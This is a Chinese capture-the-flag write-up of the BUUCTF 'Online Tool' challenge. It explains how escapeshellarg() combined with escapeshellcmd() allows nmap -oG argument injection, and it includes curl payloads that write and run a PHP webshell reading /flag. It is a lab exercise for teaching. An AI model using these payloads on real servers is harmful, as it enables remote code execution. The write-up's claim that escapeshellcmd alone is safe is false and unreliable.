---
title: "[BUUCTF 2018]Online Tool"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [command-injection, escapeshellarg-bypass, nmap-file-write, rce]
vulnerability: escapeshellarg与escapeshellcmd组合使用导致命令注入
solved: true
flag: "flag{e9736746-20cd-4146-a337-72511cc7459f}"
---

# [BUUCTF 2018]Online Tool

## 题目概述
题目提供了一个 nmap 扫描工具的 Web 接口，用户可以传入 `host` 参数进行主机扫描。源码中使用了 `escapeshellarg()` 和 `escapeshellcmd()` 对输入进行过滤，但这两个函数组合使用时存在绕过漏洞。

## 信息收集
访问页面直接显示源码：
```php
<?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

## 漏洞分析（漏洞类型、原理、判断过程）

### 漏洞类型
命令注入（通过 escapeshellarg + escapeshellcmd 组合绕过）

### 漏洞原理
1. **escapeshellarg()**: 给字符串加上单引号，并转义内部的单引号
   - 输入: `' test` → 输出: `''\'' test'`

2. **escapeshellcmd()**: 转义特殊字符 `&#;`|*?^<>()[]{}$\` 等
   - 输入: `''\'' test'` → 输出: `''\\'' test'`

3. **组合绕过**: 当两个函数连续使用时，构造特定 payload 可以逃逸单引号限制：
   - 输入: `' -oG test.php '`
   - 经过 escapeshellarg: `''\'' -oG test.php'\'''`
   - 经过 escapeshellcmd: `''\\'' -oG test.php'\\'''`
   - 最终命令中，`-oG test.php` 成功注入为 nmap 参数

4. **nmap -oG 参数**: nmap 的 `-oG` 选项可以将扫描结果输出到指定文件，结合注入的 PHP 代码实现 RCE

### 判断过程
- 源码暴露了过滤逻辑
- 识别出 escapeshellarg + escapeshellcmd 组合的经典漏洞模式
- nmap 命令存在 `-oG` 文件输出选项可利用

## 利用过程（Payload + Flag）

### Step 1: 写入 PHP 代码到文件
```bash
# Payload: ' <?php echo `cat /flag`; ?> -oG f2.php '
curl -s -G --data-urlencode "host=' <?php echo \`cat /flag\`; ?> -oG f2.php '" \
  "http://eab1048f-77fe-4608-b70b-1ff60f63f3d4.node5.buuoj.cn:81/"
```

### Step 2: 访问生成的文件获取 flag
```bash
curl -s "http://eab1048f-77fe-4608-b70b-1ff60f63f3d4.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/f2.php"
```

输出：
```
# Nmap 7.70 scan initiated Thu May  7 09:04:23 2026 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG f2.php \ flag{e9736746-20cd-4146-a337-72511cc7459f}
```

**Flag: `flag{e9736746-20cd-4146-a337-72511cc7459f}`**

## 复现步骤
1. 访问题目 URL，获取源码
2. 分析 escapeshellarg + escapeshellcmd 组合漏洞
3. 构造 payload: `' <?php echo `cat /flag`; ?> -oG shell.php '`
4. 发送请求，nmap 将包含 PHP 代码的输出写入文件
5. 访问生成的 PHP 文件，获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 命令注入 | host 参数 | `' <?php code ?> -oG file '` | escapeshellarg+escapeshellcmd 组合绕过 |
| 文件写入 | nmap -oG | `-oG shell.php` | nmap 输出参数利用 |
| RCE | PHP 文件执行 | `<?php echo \`cmd\`; ?>` | 反引号执行命令 |

## 知识总结（解题技巧、同类题型套路）

### 解题技巧
1. 看到 `escapeshellarg` + `escapeshellcmd` 组合，立即联想到绕过漏洞
2. 检查命令是否有文件输出参数（如 nmap 的 `-oG`、`-oN` 等）
3. 利用文件写入 + PHP 代码实现 RCE

### 同类题型套路
- **escapeshellarg 单独使用**: 安全，无法绕过
- **escapeshellcmd 单独使用**: 安全，无法绕过
- **两者组合使用**: 存在绕过漏洞，可注入参数
- **常见利用方式**: 
  - nmap: `-oG` (Grepable output)、`-oN` (Normal output)
  - tar: 可利用参数注入
  - git: 可利用参数注入
